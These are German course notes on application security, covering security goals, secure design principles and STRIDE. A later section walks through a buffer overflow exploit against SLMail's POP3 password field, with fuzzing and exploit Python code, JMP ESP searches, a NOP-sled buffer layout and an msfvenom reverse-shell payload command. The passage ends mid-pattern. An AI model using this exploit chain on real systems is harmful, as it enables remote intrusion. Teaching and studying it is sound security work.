---
author: [Jakob Waibel]
date: "2022-02-06"
subject: "Uni App Security Notes"
keywords: [secops, pentesting, appsec, it-security, hdm-stuttgart]
subtitle: "Notes for the Anwendungssicherheit (app security) course at HdM Stuttgart"
lang: "de"
---

# Anwendungssicherheit

## Introduction

### Contributing

These study materials are heavily based on [professor Heuzeroth's "Anwendungssicherheit" lecture at HdM Stuttgart](https://www.hdm-stuttgart.de/studierende/abteilungen/sprachenzentrum/kursangebot/kursangebot/block?sgname=Medieninformatik+%28Bachelor%2C+7+Semester%29&blockname=Anwendungssicherheit&sgblockID=2573375&sgang=550033).

**Found an error or have a suggestion?** Please open an issue on GitHub ([github.com/jakwai01/application-security](https://github.com/jakwai01/application-security)):

![QR code to source repository](./static/qr.png){ width=150px }

If you like the study materials, a GitHub star is always appreciated :)

### License

![AGPL-3.0 license badge](https://www.gnu.org/graphics/agplv3-155x51.png){ width=128px }

Uni App Security Notes (c) 2022 Jakob Waibel and contributors

SPDX-License-Identifier: AGPL-3.0
\newpage


### Was ist sichere Software?

- Software die gegen absichtliche Angriffe geschützt ist
- Software ist selten "automatisch" sicher
- Software muss jedem möglichen Angriff standhalten können

### Was ist IT-Sicherheit?

Sicherheit ist die Eigenschaft eines Systems, die dadurch gekennzeichnet ist, dass die als bedeutsam angesehen **Bedrohungen**, die sich gegen die **schützenswerten Güter** richten, durch besondere **Maßnahmen** soweit ausgeschlossen sind, dass das verbleibende **Risiko** akzeptiert wird.

**Informationssicherheit** ist die Sicherheit von IT-Systemen und ihrer Umgebung gegenüber Bedrohungen von außen, insbesondere gegenüber Angriffe durch Menschen.

### Schutzziele/Sicherheitskriterien

**CIA Security Objectives**

- **Vertaulichkeit** (**C**onfidientiality)
  - Nur Befugte können auf die Daten zugreifen/die Nachricht lesen
- **Integrität** (**I**ntegrity)
  - Manipulation der Daten ist ausgeschlossen. Es muss überprüft werden können, dass die Nachricht nicht verändert wurde
- **Verfügbarkeit** (**A**vailability)
  - Die Daten/Dienstleistungen sind immer für Befugte verfügbar, wenn sie benötigt werden

**Weitere Schutzziele**

- **Authentisierung/Authentifizierung** (**A**uthentication)
  - Für den Empfänger einer Nachricht muss es möglich sein, deren Herkunft zu ermitteln
  - Es darf nicht möglich sein, sich als jemand anderes auszugeben
- **Nicht-Abstreitbarkeit/Verbindlichkeit** (Non-repudiation)
  - Der Urheber der Daten oder Absender einer Nachricht soll nicht in der Lage sein, seine Urheberschaft zu bestreiten
- **Anonymität** (Anonymity)
  - Schutz der Geheimhaltung der Identität
- **Rechenschaftsfähigkeit** (Accountability)
  - Sicherstellung, dass Subjekte ihren Aktionen zugeordnet werden können
- **Revisionsfestigkeit** (Auditability)
  - Sicherstellung, dass vorhergehende Systemzustände wieder rekonstruiert werden können
    - Dies ist nicht im Sinne des Zurücksetzen des Systems gemeint, sondern im Sinne des Nachvollziehens, was zuvor abgelaufen ist (wer wann welche Aktion durchgeführt hat)
    - Für Audit-Log muss (SIEM = Security Incident and Event Management bzw. Security Information and Event Management) gegeben sein:
      - Vertraulichkeit
      - Integrität
      - Verfügbarkeit
      - Nicht-abstreitbarkeit
      - Rechenschaftsfähigkeit

### Sicherheitsaspekte

![Aspekte](./static/aspekte.png)

### Warum Sicherheit?

Fehler können in allen Phasen des Entwicklungsprozesses auftreten (Anforderungen, Architektur, Entwurf, Implementierung, Einsatz)

- Durchschnittlich 5 sicherheitsrelevante Fehler pro 1000 Zeilen Code
- Wachsende Konnektivität
- Steigende Komplexität
- Angriffe verlagern sich von klassicher IT auf rentablere Ziele e.g. Industrieanlagen, mobile Endgeräte, Botnetze oder Geldautomaten

Kosten der Fehlerbehebung kostet nach Produktionsauslieferung zwischen 30x-100x im Vergleich zu dem, was es beim Entwurf gekostet hätte.

### Sicherheitsbegriffe

**Bedrohung**

- Ein Angreifer mit den Mitteln und Motivation die Anwendung anzugreifen

**Schwachstelle/Sicherheitslücke**

- Fehler, der zur Verletzung von Sicherheitskriterien (CIA) genutzt werden kann

Ein **Fehler** führt zusammen mit einer **Bedrohung** zu einer **Schwachstelle**, die durch einen **Angriff** ausgenutzt werden kann

**Angriff = Motiv (Ziele) + Methoden + Schwachstelle**

**Exploit**

- Beschreibung, wie sich eine Schwachstelle für einen Angriff nutzen lässt
  - Nachweis, dass eine Schwachstelle ausgenutzt werden kann
  - Unterschied zwischen Exploit und Proof-of-Concept
    - PoC enthält keine schädlichen Funktionen, sondern demonstriert lediglich das Vorhandensein einer Schwachstelle

### Erforschung von Schwachstellen

- Prozess des Entdeckes von Schwachstellen und Entwurfsfehlern, die ein System (Betriebssystem, Anwendung, etc.) anfällig für Angriffe oder Missbrauch machen
- Klassifikation von Schwachstellen
  - Schweregrad: niedrig, mittel, hoch
  - Bereich der Ausnutzung: lokal oder aus der Ferne
- Zweck: Informationen sammeln über Sicherheitstrends, Bedrohungen und Angriffe

### Wo kann man sich über Schwachstellen informieren?

- ExploitDB
- MITRE CVE (Common Vulnerabilities and Exposures)
- MITRE CWE (Commond Weakness Enumeration)
- Google-Projekt Zero
- OWASP Top 10
- VulnDB
- ...

### Wie bestimmt man wie scherwiegend eine Schwachstelle ist?

- Bewertung des Schweregrades von Schwachstellen ist wichtig, da es wichtig ist schwachstellen zu priorisieren, um diese in der richtigen Reihenfolge zu beheben
- Vordefinierte Schwachstellenbewertungssysteme
  - CVSS (Common Vulnerability Scoring System)
  - DREAD

**Fragen, die man sich beim erstellen eines Bewertungssystems fragen sollte**

- Wie einfach ist die Schwachstelle zu lokalisieren?
- Wie einfach ist sie auszunutzen?
- Welche Berechtigungen sind erforderlich um sie auszunutzen?
- Wer kann ausnutzen?
- Wie schwerwiegend ist das Problem?
- Kann die Schwachstelle zu einer anderen führen?

### Spannungsfeld von IT-Sicherheit

![Spannungsfeld IT-Sicherheit](./static/spannungsfeld.png)

IT-Sicherheit bewegt sich im Spannungsfeld von Funktionalität und Gebrauchstauglichkeit. Mehr Sicherheit bedeutet in der Regel mehr Einschränkungen und damit weniger Funktionalität und weniger Gebrauchstauglichkeit

### Fazit

- IT-Systeme sind nur sicher, wenn alle Elemente, die zum IT-System gehören, sicher sind
- **Empfohlenes Vorgehen**: In alle Bereichen entsprechend des Risikos gezielt und moderat investieren, um die wichtigsten Tätigkeiten durchzuführen, anstatt das gesamte verfügbare Budget in einem Bereich auszugeben

## Aufgabe 2: Thema sicherer Entwurf (3+1 = 4 Punkte)

### Entwurfsprinzipien

![Entwurfsprinzipien](./static/entwurfsprinzipien.png)

Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In diesem Fall muss man abwägen, welches im konkreten Fall das wichtigere Prinzip bei der Umsetzung ist. So kann es beispielsweise sinnvoll sein, "Einfachheit (Ökonomie des Mechanismus)" zu Gunsten von "Mehrstufige Verteidigung (Trennung von Privilegien)" zu opfern. Ein anderes Beispiel ist, dass kompliziertere Passwortanforderungen, die psychologische Akzeptanz behindern.

#### Minimierung der Angriffsfläche

- **Prinzip**
  - Dem Angreifer so wenig Angriffsfläche bieten, wie möglich
  - Jedes Feature vergrößert die Angriffsfläche
- **Beispiel**
  - Suchfunktion, die anfällig gegen SQL-Injektion sein könnte. Dies könnte durch Datenvalidierung der Suchfunktion, autorisierung oder einem Glossar behoben werden
- **Verwandte Prinzipien**
  - "Einfachheit"
  - "Ökonomie des Mechanismus"
- **Aspekte zur Minimierung der Angriffsfläche**
  - Menge des aktuell ausgeführten Programmcodes reduzieren
  - Menge der Zugangspunkte und Schnittstellen zur Software minimieren
  - Rechte, mit denen der Programmcode laufen muss anpassen, sodass angreifer dadurch keine Vorteile oder Zugriffe auf andere Tools erhalten

#### Sichere Vorbelegung

- **Prinzip**
  - Anwendungen sind so auszuliefern, dass sie möglichst sicher vorkonfiguriert sind
  - Anwender können Sicherheitsmaßnahmen dann nach Bedarf reduzieren
- **Beispiel**
  - Passwortrichtlinie
    - Sichere Vorbelegung
      - Auf Stärke Prüfen
      - Läuft ab
    - Kann bei bedarf abgestellt werden
  - **Firewall**
    - Standardmäßig sind alle Ports geschlossen
    - Notwendige Ports werden geöffnet
- **Verwandte Prinzipien**
  - "Prinzip des kleinsten Privilegs"
  - "Kleinster gemeinsamer Mechanismus"

#### Prinzip des kleinsten Privilegs

- **Prinzip**
  - Jede Funktion ist nur mit den minimal erforderlichen Rechten ausgestattet, unabhängig davon, ob sie intern ausgeführt wird oder aufgrund einer Benutzeranforderung
- **Privilegien können sein**
  - Zugriffsberechtigungen
  - Rechenzeit
  - Speicherplatz im Hauptspeicher oder auf Festspeichern
  - Netzwerkbandbreite
- **Beispiel**
  - Normale Benutzer bekommen keine Administratorrechte
  - Administratoren dürfen keine fachspezifischen Berechtigungen haben
- **Verwandte Prinzipien**
  - "Minimierung der Angriffsfläche"
  - "Pflichtentrennung"

#### Prinzip der mehrstufigen Verteidigung

- **Prinzip**
  - Es sind mehrere Sicherheitsmaßnahmen hintereinander zu verschiedenen Aspekten einzurichten
- **Hinweis**
  - Dieses Prinzip sollte je nach Kritikalität der Daten/Prozesse angewendet werden, da es sehr aufwändig ist
- **Verwandte Prinzipien**
  - "Vollständige Vermittlung"
  - "Pflichtentrennung"
- **Verteidigungsstufen**
  - Authentifizierung
  - Autorisierung
  - Verschlüsselung
  - Audit
- **Beispiel**
  - Ein Fehler in der Administrationsoberfläche erlaubt nicht gleich Administratorzugang zur ganzen Anwendung, wenn Zugriffsberechtigungen für jeden Zugriff separat geprüft werden und außerdem noch alle Zugriffe protokolliert werden

#### Sicheres Verhalten bei Fehlern bzw. Ausnahmen

- **Prinzip**
  - Vertraulichkeit der Fehlermeldungen
  - Keine detaillierten Fehlermeldungen für den Anwender sichtbar
  - Transaktionen schlagen in Anwendungen oft aus verschiedenen Gründen fehl
  - Anwendungen können abstürzen
  - Wie die Anwendung einene solchen Fehlschlag behandelt, entscheidet darüber, ob die Anwendung sicher ist oder nicht.
- **Beispiel**
  - Falls `codeWhichMayFail()` fehlschlägt, dann ist der Anwender automatisch Administrator. Dies ist dann offensichtlich ein Sicherheitsrisiko.
    ```java
    isAdmin = true;
    try {
        codeWhichMayFail();
        isAdmin = isUserInRole("Admin");
    } catch (Exception ex) {
        log.write(ex.toString());
    }
    ```
- **Verwandte Anforderungen und Prinzipien**
  - Anforderungskategorie "Ausnahmebehandlung"
  - "Sichere Vorbelegung"

#### Behandle externe Systeme als unsicher

- **Prinzip**
  - Daten, die von externen Systemem kommen, sind zunächst einmal nicht vertrauenswürdig und müssen erst validiert werden, bevor sie verarbeitet oder dem Benutzer angezeigt werden.
- **Beispiel**
  - Eine Online-Banking-Anwendung von Drittanwendung
  - Internes System muss Daten von externem System auf Sicherheit prüfen (e.g. nicht-negativ, in den boundaries)
- **Verwandtes Prinzip**
  - "Zurückhaltung beim Vertrauen"

#### Pflichtentrennung

- **Prinzip**
  - Mehrere Sicherheitsebenen verwenden, die sich idealerweise gegenseitig kontrollieren
  - Einführung von Rollen, die einer höheren Vertrauensstufe angehören als normale Benutzer, hilft bei der Umsetzung
- **Beispiele**
  - Administratoren dürfen das System verwalten e.g. hoch- und runterfahren, Passwortrichtlinien einstellen, etc.
  - Administratoren dürfen sich aber nicht als besonders privilegierte Endanwender bei der Anwendung anmelden
  - Andernfalls könnten sie auch im Namen anderer Benutzer agieren
- **Verwandte Prinzipien**
  - "Prinzip des kleinsten Privilegs"
  - "Prinzip der mehrstufigen Verteidigung"
  - "Zurückhaltung beim Vertrauen"

#### Verlasse Dich nicht auf Sicherheit durch Verschleierung

- **Prinzip**
  - Etwas geheim zu halten oder zu verstecken sollte nicht der einzige Sicherheitsmechanismus sein
- **Beispiel**
  - Die Geheimhaltung des Quelltextes einer Anwendung garantiert nicht, dass die Anwendung sicher ist
  - Versteckte URLs, die sich durch Brute-Force-Angriffe evtl. doch finden lassen
- **Verwandtes Prinzip**
  - "Offener Entwurf"

#### Einfachheit/KISS

- **Prinzip**
  - Einfache Programme bieten weniger Angriffsfläche, alleine schon deswegen, weil dadurch Programmierfehler weniger wahrscheinlich sind
  - Vermeide daher alles was unnötig komplex oder kompliziert ist
- **Beispiele**
  - Doppelte Negationen
  - Zu komplexe Architekturen
- **Verwandte Prinzipien**
  - "Minimierung der Angriffsfläche"
  - "Ökonomie des Mechanismus"

#### Behebe Sicherheitslöcher richtig

- **Prinzip**
  - Erst einen Testfall für die Sicherheitslücke erstellen und implementieren
  - Fehlerursache verstehen
  - Fehler beheben und überprüfen durch Tests
- **Anmerkung**
  - Heutzutage oft Designpatterns
  - Fehler in Entwurfsmuster ist in allen Anwendungen zu beheben, die dieses Implemenieren
- **Beispiel**
  - Online-Banking-Kunde kann durch veränderung des Cookies den Kontostand anderer Kunden sehen
  - Der Umgang mit Cookies wird auch in anderen Anwendungen in dieser Form eingesetzt, muss also auch verändert werden

#### Eingabevalidierung/Ausgabekodierung

- **Prinzip**
  - Eingaben auf korrektheit prüfen 
  - Ausgabe kontrollieren
- **Beispiel**
  - Angreifer kann Schadcode in Formularfeld einfügen, welcher dann auf einem anderen IT-System ausgeführt wird
  - SQL-Injection

#### Sichere das schwächste Glied

- **Prinzip**
  - Sicherheitsmaßnahmen sollen zuerst dort angewendet werden, wo sie am meisten erforderlich sind, nicht dort wo sie bequem implementiert werden können
- **Beispiel**
  - Wenn eine Schachstelle A aus dem Internet ausgenutzt weden kann und eine Schwachstelle B im Intranet ausgenutzt werden kann, dann muss zuerst Schwachstelle A abgesichert werden
- **Hinweis**
  - Zuerst Bedrohungen adressieren, die im Rahmen der Bedrohungsmodellierung das höchste Risiko ergeben haben

#### Ökonomie des Mechanismus

- **Prinzip**
  - Den Entwurf so einfach wie möglich halten
- **Verwandtes Prinzip**
  - "Einfachheit"

#### Vollständige Vermittlung

- **Prinzip**
  - Jeden Objektzugriff durch eine Berechtigungsprüfung absichern
- **Verwandte Prinzipien**
  - "Prinzip der mehrstufigen Verteidigung" (Defense in Depth)

#### Kleinster gemeinsamer Mechanismus

- **Prinzip**
  - Minimierung der Anzahl der Mechanismen, die von Anwendern gemeinsam verwendet werden müssen
  - Je mehr Mechanismen, desto größer ist die Wahrscheinlichkeit für falschen Einsatz und falsche Konfiguration bzw. Abstimmungslücken
- **Verwandtes Prinzip**
  - "Minimierung der Angriffsfläche"
  - "Einfachheit"

#### Psychologische Akzeptanz

- **Prinzip**
  - Sicherheitsmechanismes dürfen die Verwendung der Software nicht gravierend beeinträchtigen
- **Beispiel**
  - Wenn zu viele Sicherheitsabfragen beantwortet werden müssen, dann werden diese nicht mehr richtig gelesen und nicht mehr ernst genommen
    - Alle Sicherheitsabfragen werden akzeptiert, d.h. mit "weiter" beantwortet ohne den Text zu lesen
    - Sicherheitsabfragen werden generell abgeschaltet

#### Zurückhaltung bei Vertrauen

- **Prinzip**
  - Allen Daten, die von außen kommen, ist zu misstrauen
- **Verwandte Prinzipien**
  - "Behandle externe Systeme als unsicher"
  - "Pflichtentrennung"

#### Schutz der Privatssphäre

- **Prinzip**
  - Schütze die Daten der Anwender
- **Rechtliche Grundlagen** (Datenschutzgrundverordnung, Bundesdatenschutzgesetz, Landesdatenschutzgesetz)
- **Grundsätzliche Regel**: "Verbot mit Erlaubnisvorbehalt"
  - Verarbeitung von personenbezogenen Daten grundsätzlich verboten
  - Ausnahme: Für legitimen Zweck (Vertrag oder Gesetz)

#### Offener Entwurf

- **Prinzip**
  - Sicherheit sollte nicht ausschließlich auf der Gerheimhaltung des Entwurfs beruhen
- **Verwandtes Prinzip**
  - "Verlasse Dich nicht auf Sicherheit durch Verschleierung"

### Stride Flussdiagramm - Entwurfsprinzipien

![Datenflussdiagramm](./static/dfd.png)

- Durch Vertrauensgrenze wird "Seperation of Priviledges" erreicht. Außerdem wird damit "Behandle externe Systeme als Unsicher" erreicht.
- Nach AuthN ist die Identität vertrauenswürdig. Ob Allerdings die Anfrage an sich legitim ist wissen wir noch nicht.
- AuthZ prüft, ob die Anfrage valide ist. Hierbei kommt das Entwurfsprinzip der "Eingabevalidierung" zur geltung.
- Durch Authentifizierung und Autorisierug/Berechtigungsprüfung haben wir eine "Mehrstufige Verteidigung" implementiert.

### Anwendung des Beispiels auf STRIDE

- **Spoofing Identity** kann mit AuthN verhindert werden
- **Tampering Information** ist auf physisches Beispiel schwer anwendbar. Es könnte jemand anderes unterschrieben haben, wodurch man eventuell Informationen über einen anderen Account erhält. Digital wäre das mit einer SQL-Injection vergleichbar
- **Repudiation** wird in diesem Beispiel nicht verhindert. Wir bräuchten Logging ins Audit-Log (Man kommt jeden Tag in die Filiale und versucht mit gefälschtem Ausweis AuthN zu umgehen). Wir können nicht sagen, dass diese Person schon versucht hat das System zu umgehen. Auch bei AuthZ wird nicht geprüft wie viele invalide withdrawal-Anfragen schon gestellt wurden. Auch hier bräuchten wir wieder Logging ins Audit-Log. In beiden Fällen ist die Kante ins Audit-Log Rot-Grün (Orange), da ein Teil des Logs vertrauenswürdig ist (AuthN, AuthZ), und Teile nicht (Withdrawal Request, Identification Data)
- **Information Disclosure** wird hier gut gehandhabt. Kunde bekommt keine Informationen, außer ob er Geld bekommt oder nicht
- **Denial of Service** kann Online durch IP-Sperren oder Banbreitenbegrenzung verhindert werden. Analog halten sehr alte Leute oft den Verkehr auf. In diesem Fall könnte man gegen diese "Attacke" vorgehen, indem man ein Wartezimmer einfügt
- **Elevation of Priviledges** wird hier weitesgehend verhindert. Man hätte nur die Privilegien, wenn man es schafft sich als jemand anderes auszugeben. AuthN und AuthZ sind die Gegenmaßnahmen, die unser System dagegen bietet

## Aufgabe 3: Penetration Test: Buffer Overflow (10 Punkte)

### Was ist ein Buffer Overflow?

Ein Buffer Overflow tritt auf, wenn die Länge von Eingaben nicht überprüft wird.

Bei einem Buffer Overflow überschreitet ein Eingabewert den für ihn im Speicher vorgesehenen Platz und überschreibt dadurch andere wichtige Speicherbereiche.
Überschrieben wird typischerweise der Speicherbereich, in dem sich die Rücksprungadresse aus einer aufgerufenen Funktion befindet, da man dadurch als Angreifer den Programmablauf kontrollieren kann.

In folgendem Code kann ein Buffer Overflow auftreten, da die Länge des Inputs nicht geprüft wird:

```C
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv)
{
    char buffer[500];
    strcpy(buffer, argv[1]);

    return 0
}
```

### Wie findet man einen Buffer Overflow?

- Begutachtung des Quelltextes, falls dieser zugänglich ist
- Reverse Engineering
  - OllyDbg
  - ImmunityDebugger
  - gdb
  - edb
- Fuzzing
  - Zufällige Eingabe an die Anwendunge schicken, bis diese Abstürzt

### Verwendung von Windows Debuggern

- OllyDbg, ImmunityDebugger
- Zu untersuchendes Programm laden mit Hilfe von File -> Attach
- F2: Breakpoint setzen
- F7: In Funktion springen
- F8: Funktion ausführen ohne hineinzuspringen
- Inhalt des Speichers ab einer Adresse anzeigen, die in einem Register steht:
  - Rechtsklick auf eine Speicheradresse in einem Register, dann "Follow in Dump"
- Befehl oder Befehlssequenz suchen:
  - Rechtsklick "Search For" -> "Command" bzw. "Sequence of Commands"
- `mona.py`: ImmunityDebugger-Erweiterung
  - `!mona` zeigt die Informationsseite an
  - Mit Toolbar-Icon "l" oder Alt+L kann man auf die Log-Ansicht umschalten
  - Hilfe zu einem Befehl `!mona help <Befehl>`

### Verhalten des Stacks bei einem Buffer Overflow

![Stack](./static/stack.png)

### Vorgehen

#### Fuzzing/Taking Control of EIP

- Eingaben an die Anwendung schicken, die von der Anwendung so nicht vogesehen waren und auf den Absturz der Anwendung warten
- Ein Absturz deutet auf eine fehlende oder schlechte Eingabevalidierung hin

- Schickt man einfach nur eine Wiederholung eines Buchstabens, e.g. "AAAA...", dann weiß man im nachhinein nicht, welcher Teil der Eingabe wo gelandet ist
- Binäre Suche
  - Erste Hälfte A, zweite B
  - Stehen im `EIP` A's, dann den linken Teilbereich wieder in zwei Teile teilen und so weiter bis man den EIP korrekt lokalisiert hat
  - Dauert vergleichsweise lang
- Unique String
  - Schicken einer eindeutigen Zeichenkette, die ein Auffinden zulassen
  - Generiert werden kann eine solche Zeichenkette z.B. mit einem in Metasploit mitgelieferten Ruby-Skript:
  ```shell
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
  ```
  - Muster wiederfinden
  ```shell
  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <query> -l <length>
  ```

#### Bad Characters

- Manche Zeichen haben besondere Effekte in der Zielanwendung e.g. `\x00`Null Byte - Wird als String-Ende interpretiert, `\x0D`Carriage Return - Beendet Eingabe für POP-Server
- Am besten alle Hex-Zeichen von 00 bis FF ausprobieren und problematische weglasse, wenn man Shellcode kodiert

#### Redirect Execution

- Die Adresse des ESP kann sich bei jeder Ausführung des Programms ändern
- Weitere Module (e.g. DLLs), welche kein ASLR (Address Space Layout Randomization) verwenden, nach `JMP ESP` oder `PUSH ESP`/`RETN` Anweisungen durchsuchen
- Mit Hilfe der `nasm_shell` können Assembly in die jeweiligen Opcodes übersetzen 

```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000 FFE4
```

- Mit Hilfe von `!mona modules` können sich Informationen über die Module finden lassen. Dort kann man dann auch sehen ob ASLR oder DEP (Data Execution Prevention) aktiviert ist, um geeignete Module festzustellen
- Außerdem darf die Speicheradresse des Sprungbefehls `JMP ESP` keine problematischen Zeichen e.g. `\x00`, `\x0A` oder `\x0D` enthalten
- Dieses Module dann im im ImmunityDebugger öffnen
  - Toolbar Icon "e" für executable Modules anklicken
  - Dopelklick auf den Namen des Modules
  - Suche nach Befehlen oder Befehlssequenzuen durchführen
    - Rechtsklick "Search For" -> "Command" oder "Sequence of Commands"
  - Falls diese Suche nicht erfolgreich ist, Suche im gesamten Speicherbereich (auch Datensegmenten) der Anwendung durchführen
    - Dies ist zielführend, falls DEP nicht aktiviert ist.
      - Durch Toolbar Icon "m" werden alle Segmente (Module) mit ihren Flags angezeigt, so dass dies nochmals überprüft werden kann.
    - DEP = Data Execution Prevention: Verhindert Ausführung von Code aus Datenbereichen durch Hard- und Software-Prüfungen.
  - Toolbar Icon "c" anklicken, dann:
  ```shell
  !mona find -s "\xff\xe4" -m <Modulname>
  ```

#### Schadcode generieren

`msfvenom [Optionen] <var=val>` (/usr/share/metasploit-framework)

```shell
-p <payload> Zu erzeugender Schadcode (payload) Beispiel: `-p windows/shell_reverse_tcp`
-f <format> Ausgabeformat, e.g. c für Ausgabe in Sprache C. --help-formats zeigt verfügbare Formate an
-a <architecture> Zielarchitektur des Schadcodes, z.B. `x86` für 32bit
--platform <platform> Zielplatform des Schadcodes, z.B. `windows`
-b <list> Liste im erzeugten Code zu vermeidender problematischer Zeichen (bad characters).
-e <encoder> Kodierung des Shellcodes, z.B. `x86/shikata_ga_nai`
-l <module_type> Modultyp auflisten. `module_type` kann sein: `payloads`, `encoders`, `nops`, `all`
```

- Parameter für Schadcode (payload): `LHOST`, `LPORT` etc.
- Beispiel: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
- `EXITFUNC=thread` verhindert Absturz des Zielprozesses bei Beenden der Reverse Shell

**Problem**: Der erzeugte Schadcode enthält zu Beginn den Dekodierer, um den eigentlichen Schadcode aus den Bytes zurückzugewinnen

- Der Dekodierer benötigt zum Dekodieren aber Speicherplatz am Anfang des Stack-Bereichs
- Wird dieser nicht geschaffen, überschreibt der Dekodierer den zu dekodierenden Shell-Schadcode

**Abhilfe**

- Platz für den Dekodierer durch "No Operation" Opcodes (NOOPS) mit der Hexkodierung `\x90` schaffen

```python
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" *(3500-2606-4-351-16)
```

**Sonderfall**
Manchmal passt der Schadcode vom Umfang her nicht mehr in den verfügbaren Speicherplatz ab der Adresse auf die ESP zeigt.

**Lösung**

- Anderes Register suchen, welches auf eine Adresse zeigt, welche möglichst nah am Beginn des durch einen Angriff eingefügten Puffers liegt, e.g. `EAX`
- Registerwert anpassen und dann dorthin springen
  - `ADD <Register>, <Anpassungswert>`
    - e.g. `ADD EAX, 12`
  - `JMP EAX`
- Die zugehörigen Opcodes dann in den Speicherbereich schreiben auf den ESP zeigt, so dass ein bereits im Programm vorhandener `JMP ESP` Befehl, dessen Adresse in EIP geschrieben wird, diese Opcodes (1. Stufe des Shellcodes) ausführt, welche dann den eigentlichen Shellcode (2. Stufe des Shellcodes) ausführen, der an `EAX+12` liegt.

#### Resuliterendes SL-Mail Python-Skript

```python
#!/usr/bin/python

def connect_to_SLMail(ip, buffer):
    """Connecting to SLMail server using provided buffer for password field"""
    import socket
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,110))      # connect to IP, POP3 port
        data=s.recv(1024)                   # receive banner
        print(data)

        s.send('USER root\r\n')             # send username "test"
        data=s.recv(1024)                   # receive reply
        print(data)

        s.send('PASS ' + buffer + '\n\n')   # send password
        data=s.recv(1024)                   # receive reply
        print(data)
        s.send('QUIT\r\n')                  # send "QUIT"
        s.close()
    except:
        print "Could not connect to POP3 port\n"


def fuzz(ip):
    """Fuzzing password field of SLMail server to detect crash"""
    buffer=["A"]
    counter=100
    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+200
    for string in buffer:
        print("Fuzzing PASS of {0} with {1} bytes".format(ip, len(string)))
        connect_to_SLMail(ip, string)


def replicate_crash(ip):
    """Replicating the crash using a string of A\'s with the neccessary length"""
    buffer = "A"*2700
    connect_to_SLMail(ip, buffer)


def attack_with_unique_string(ip):
    """Connecting to SLMail server with a unique string created by metasploit's pattern_create.rb script"""
#    Using a unique string to determine where each part of the input is placed on victim machine.
#    Unique string has been created with:
#      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
#
#   Offset of string in EIP register can then be determined with:
#      /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <PATTERN>
#
    buffer='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7B